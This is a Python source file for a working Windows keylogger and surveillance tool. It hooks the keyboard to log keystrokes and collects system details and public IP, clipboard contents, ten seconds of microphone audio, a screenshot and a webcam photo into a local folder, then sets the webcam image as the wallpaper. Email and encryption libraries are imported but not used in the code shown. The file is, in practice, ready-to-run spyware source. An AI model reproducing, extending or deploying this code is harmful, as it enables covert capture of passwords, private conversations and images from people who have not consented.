
import os

# Libraries
try:
    from email.mime.multipart import MIMEMultipart
    from email.mime.text import MIMEText
    from email.mime.base import MIMEBase
    from email import encoders
    import smtplib
    import socket
    import platform
    import win32clipboard
    from pynput.keyboard import Key, Listener
    import time
    import os
    from scipy.io.wavfile import write
    import sounddevice as sd
    from cryptography.fernet import Fernet
    from requests import get
    from cv2 import VideoCapture, imshow, imwrite, destroyWindow, waitKey
    from PIL import ImageGrab
    import keyboard
    import datetime
    from functools import partial
    from urllib import request
    import atexit
    import json
    import ctypes
    import threading
except:
    os.system("pip install -r requirements.txt")

# Global Variables
cwd = os.path.join(os.getcwd(), 'out')

if (os.path.isdir(cwd) is not True): os.mkdir(cwd, 0o666)

dt = str(datetime.datetime.now().strftime("%Y%m%d_%H%M%S"))
keys_info = os.path.join(cwd, "key_log_" + dt + ".txt")
system_info = os.path.join(cwd, "systeminfo_" + dt + ".txt")
clipboard_info = os.path.join(cwd,"clipboard_" + dt + ".txt")
audio_info = os.path.join(cwd, "audio_" + dt + ".wav")
screenshot_info = os.path.join(cwd, "screenshot_" + dt + ".png")
webCamShot_info = os.path.join(cwd, "webCamera_" + dt + ".png")
keystrokes_info = os.path.join(cwd, "keystrokes" + dt + ".log")

keys_info_e = os.path.join(cwd, "e_key_log_" + dt + ".txt")
system_info_e = os.path.join(cwd, "e_systeminfo_" + dt + ".txt")
clipboard_info_e = os.path.join(cwd, "e_clipboard_" + dt + ".txt")

microphone_time = 10
time_iteration = 15
number_of_iterations_end = 3

crypt_key = " " # Generate an encryption key from the Cryptography folder

MAP = {
  "space": " ",
  "\r": "\n"
}

TERMINATE_KEY = "f7"
TIMER_DURATION = 30  # Time in seconds (e.g., 60 seconds)

def callback(output, is_down, event):
    if event.event_type in ("up", "down"):
        key = MAP.get(event.name, event.name)
        modifier = len(key) > 1
        # Capture only modifiers when keys are pressed
        if not modifier and event.event_type == "down": return
        # Avoid typing the same key multiple times if it is being pressed
        if modifier:  
            if event.event_type == "down":
                if is_down.get(key, False): return
                is_down[key] = True
            elif event.event_type == "up": is_down[key] = False
            key = " [{} ({})] ".format(key, event.event_type)  # Indicate if the key is being pressed
        # Line break
        elif key == "\r": key = "\n"  
        output.write(key)  # Write the key to the output file
        output.flush()  # Force write

def onexit(output):
    output.close()

def timer_termination():
    print(f"Keylogger will stop in {TIMER_DURATION} seconds...")
    time.sleep(TIMER_DURATION)
    print("Timer expired. Stopping keylogger.")
    keyboard.unhook_all()  # Unhook all keyboard events to stop the keylogger

def key_logger():
    print('Starting system information...')
    print("Press F7 to terminate or wait for the timer to expire.")
    try:
        is_down = {}  # Indicates if a key is being pressed
        output = open(keystrokes_info, 'a')  # Output file
        atexit.register(onexit, output)  # Close the file at the end of the program

        # Start the keylogger hook
        keyboard.hook(partial(callback, output, is_down))
        
        # Start the timer in a separate thread
        timer_thread = threading.Thread(target=timer_termination)
        timer_thread.daemon = True  # Ensure thread terminates when main thread exits
        timer_thread.start()
        
        # Wait for the terminate key (F7) to be pressed
        keyboard.wait(TERMINATE_KEY)
        print("Terminate key pressed. Stopping keylogger.")
        keyboard.unhook_all()  # Unhook all keyboard events to stop the keylogger
        
    except PermissionError:
        print("File is probably being used by another process.")

# Get System Information
def system_information():
    print('starting system information')

    with open(system_info, '+x') as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip + '\n')
        except Exception:
            f.write("Couldn't get Public IP Address (May be due to max query) \n")

        f.write("Processor Info: " + (platform.processor()) + '\n')
        f.write("System Info: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + '\n')
        f.write("Hostname: " + hostname + '\n')
        f.write("Private IP Address: " + IPAddr + '\n')

# Copy Clipboard Data
def copy_clipboard():
    print('starting clipboard information')

    with open(clipboard_info, '+x') as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            f.write("Clipboard Data : \n" + pasted_data + '\n')
        except:
            f.write("Clipboard Could not be copied. \n")

# Get Microphone Recordings
def microphone():
    print('starting microphone information')

    fs = 44100
    seconds = microphone_time
    myrecording = sd.rec(int(seconds*fs), samplerate=fs,channels=2)
    sd.wait()
    write(audio_info, fs, myrecording)

# Get Screenshots
def screenshots():
    print('starting screenshot information')

    im = ImageGrab.grab()
    im.save(screenshot_info)

# Get Snap with WebCamera
def web_camera():
    print('starting web camera information')

    screenshots
    cam = VideoCapture(0)
    result, image = cam.read()
    if result:
        imshow("webCam", image)
        imwrite(webCamShot_info, image)
        waitKey(1)
        destroyWindow("webCam")

def set_wallpaper():
    # Constants for setting the wallpaper
    SPI_SETDESKWALLPAPER = 20
    SPIF_UPDATEINIFILE = 0x01
    SPIF_SENDWININICHANGE = 0x02

    # Call Windows API to change wallpaper
    result = ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, webCamShot_info, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE)
    if result: print("Wallpaper changed successfully!")
    else: print("Failed to change wallpaper.")

def main():
    system_information()
    copy_clipboard()
    microphone()
    screenshots()
    web_camera()
    set_wallpaper()
    key_logger()

if __name__ == "__main__":
  main()